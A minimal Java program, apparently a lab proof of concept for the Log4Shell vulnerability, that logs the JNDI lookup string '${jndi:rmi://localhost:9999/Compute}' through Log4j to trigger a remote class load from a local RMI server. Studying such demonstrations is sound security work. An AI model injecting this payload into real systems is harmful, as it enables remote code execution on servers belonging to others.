package top.lovelily.remote;



import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


/**
 * Desc: LocalServer
 * Author: Xu He
 * created: 2021/12/13 11:01
 */

public class LocalServer {
    private static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        String input = "${jndi:rmi://localhost:9999/Compute}";
        logger.info("hello1 {}", input);
    }
}
